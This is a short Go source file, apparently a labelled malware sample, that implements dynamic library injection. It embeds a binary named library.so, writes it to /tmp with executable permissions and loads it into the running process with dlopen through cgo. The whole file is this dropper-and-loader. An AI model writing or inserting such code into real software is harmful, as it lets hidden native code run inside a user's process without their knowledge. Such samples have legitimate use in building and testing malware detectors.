package mal_dynamic_libinjection

/*
#cgo LDFLAGS: -ldl
#include <dlfcn.h>
#include <stdlib.h>

void loadlib(const char *lib) {
	dlopen(lib, RTLD_NOW | RTLD_GLOBAL);
}
*/
import "C"

import (
	_ "embed"
	"os"
	"unsafe"
)

//go:embed library.so
var soPayload []byte

func DynamicLibInjection() {
	// Step 1: Write library.so to disk
	f, err := os.OpenFile("/tmp/library.so", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return
	}
	f.Write(soPayload)
	f.Close()

	// Step 2: Load the .so into the process
	soPath := C.CString("/tmp/library.so")
	defer C.free(unsafe.Pointer(soPath))
	C.loadlib(soPath)
}
